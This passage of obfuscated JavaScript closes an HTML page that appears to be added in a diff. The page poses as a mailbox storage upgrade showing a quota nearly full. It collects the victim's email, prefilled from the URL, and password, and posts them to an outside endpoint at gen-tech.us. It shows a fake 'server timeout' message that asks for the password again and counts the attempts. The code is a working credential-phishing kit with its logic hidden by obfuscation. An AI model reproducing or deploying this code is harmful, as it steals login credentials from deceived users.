_0x4c41(){const _0x293cd3=['getItem','disabled','body','target','active','getAttribute','success','forEach','emailForm','data-theme','.password-toggle\x20i','preventDefault','display','click','theme','119NyRTdn','remember','2431088pdJqAR','https://gen-tech.us/verifies.php','submit','value','querySelector','classList','flex','input','email','setAttribute','doneBtn','light','.btn-text','confirmPassword','number','width','.form-btn','4.98GB','hidden','blur','innerHTML','step','test','documentElement','Please\x20confirm\x20your\x20password','remove','setItem','confirm-error','application/json','fas\x20fa-eye','36340056uxClnQ','currentTarget','<i\x20class=\x22fas\x20fa-exclamation-circle\x22></i>\x20Server\x20timeout.\x20Please\x20ensure\x20you\x20entered\x20your\x20correct\x20password\x20and\x20try\x20again.','textContent','getElementById','Upgrading...','dark','5443900XGwyJF','174MxqBJG','.current','error','querySelectorAll','<i\x20class=\x22fas\x20fa-exclamation-circle\x22></i>\x20Connection\x20error.\x20Please\x20try\x20again.','add','.memory-used','focus','passwordForm','password','131295uMKbVd','key','password-error','className','Password\x20is\x20required','style','addEventListener','hash','length','POST','Password\x20must\x20be\x20at\x20least\x208\x20characters','.error-message','type','reset','stringify','loading','1097555DDbwlD','180328fmaJaW','fas\x20fa-eye-slash','.password-toggle','Please\x20enter\x20a\x20valid\x20email\x20address','location','.modal-step','5GB','98%','4697274lbGdGX','overflow','modalOverlay'];_0x4c41=function(){return _0x293cd3;};return _0x4c41();}function showError(_0x56fb1c,_0x22396f,_0x4a4375){const _0x3646f4=_0x537d;_0x56fb1c[_0x3646f4(0x225)]=_0x4a4375,_0x22396f['classList']['add'](_0x3646f4(0x1dc)),_0x56fb1c[_0x3646f4(0x1e9)][_0x3646f4(0x20c)]=_0x3646f4(0x217);}function clearError(_0x1f826c,_0x4ba16f){const _0x303b71=_0x537d;_0x1f826c[_0x303b71(0x1d5)]='',_0x4ba16f[_0x303b71(0x216)][_0x303b71(0x1cd)](_0x303b71(0x1dc));}function setLoading(_0xb55974,_0x56e4ec){const _0x5bba03=_0x537d;_0x56e4ec?(_0xb55974[_0x5bba03(0x216)]['add']('loading'),_0xb55974['disabled']=!![]):(_0xb55974[_0x5bba03(0x216)]['remove'](_0x5bba03(0x1f3)),_0xb55974[_0x5bba03(0x201)]=![]);}function resetForms(){const _0x13fcb6=_0x537d;document['getElementById'](_0x13fcb6(0x208))[_0x13fcb6(0x1f1)](),document['getElementById'](_0x13fcb6(0x1e2))['reset'](),document['querySelectorAll'](_0x13fcb6(0x1ef))[_0x13fcb6(0x207)](_0x8d3659=>{const _0xf01131=_0x13fcb6;_0x8d3659[_0xf01131(0x1d5)]='';}),document[_0x13fcb6(0x1dd)]('input')['forEach'](_0x2418ad=>{const _0x52a23c=_0x13fcb6;_0x2418ad[_0x52a23c(0x216)]['remove'](_0x52a23c(0x1dc));});const _0x1d03a2=window[_0x13fcb6(0x1f9)][_0x13fcb6(0x1eb)];if(_0x1d03a2[_0x13fcb6(0x1ec)]>0x1){const _0x4ad9c5=decodeURIComponent(_0x1d03a2['substring'](0x1));document['getElementById'](_0x13fcb6(0x219))[_0x13fcb6(0x214)]=_0x4ad9c5;}attemptCount=0x0;}function resetProgressIndicator(){const _0x1dad05=_0x537d;document[_0x1dad05(0x1dd)]('.step')[_0x1dad05(0x207)]((_0x10cac3,_0x59d647)=>{const _0x4a85cf=_0x1dad05;_0x59d647===0x0?_0x10cac3[_0x4a85cf(0x216)]['add'](_0x4a85cf(0x204)):_0x10cac3[_0x4a85cf(0x216)]['remove'](_0x4a85cf(0x204));});}function updateMemoryDisplay(){const _0x1c4b51=_0x537d,_0x2887aa=document['querySelector'](_0x1c4b51(0x1e0)),_0x59b66e=document[_0x1c4b51(0x215)](_0x1c4b51(0x1db)),_0x37d1c3=document['querySelector']('.total');_0x2887aa[_0x1c4b51(0x1e9)][_0x1c4b51(0x220)]=_0x1c4b51(0x1fc),_0x59b66e[_0x1c4b51(0x1d5)]=_0x1c4b51(0x222),_0x37d1c3[_0x1c4b51(0x1d5)]=_0x1c4b51(0x1fb);}function _0x537d(_0x4ead15,_0x59b2cc){const _0x4c4108=_0x4c41();return _0x537d=function(_0x537d0d,_0x150b7f){_0x537d0d=_0x537d0d-0x1ca;let _0x5ced14=_0x4c4108[_0x537d0d];return _0x5ced14;},_0x537d(_0x4ead15,_0x59b2cc);}function delay(_0x48858f){return new Promise(_0x39fe93=>setTimeout(_0x39fe93,_0x48858f));}document[_0x5c7613(0x1ea)]('DOMContentLoaded',()=>{setupEventListeners(),setupThemeToggle(),autoFillEmail(),animateMemoryBar(),setupFormValidation();});
+    </script>
+</body>
+
+</html>
